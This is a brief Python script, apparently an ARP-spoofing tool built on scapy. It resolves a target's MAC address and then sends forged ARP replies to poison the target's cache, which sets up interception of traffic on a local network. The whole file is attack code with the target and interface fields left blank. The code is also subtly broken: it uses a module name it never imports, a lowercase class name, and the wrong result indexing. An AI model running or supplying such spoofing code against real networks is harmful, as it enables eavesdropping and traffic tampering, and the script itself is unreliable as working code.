from scapy import *
import os

target_ip = "" 
self_ip = ""
interface = ""

def find_mac_address(ip):
    packet = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")/scapy.arp(pdst = ip)
    answer = scapy.srp(packet, iface=interface, timeout=2, verbose=False)[0]
    mac_address = answer[1][0].hwsrc
    return mac_address
 
def spoof(target_ip, spoofed_ip):
    packet = scapy.arp(op = 2, hwdst = find_mac_address(target_ip), pdst=target_ip, psrc=spoofed_ip)
    scapy.send(packet, iface=interface, verbose=False)


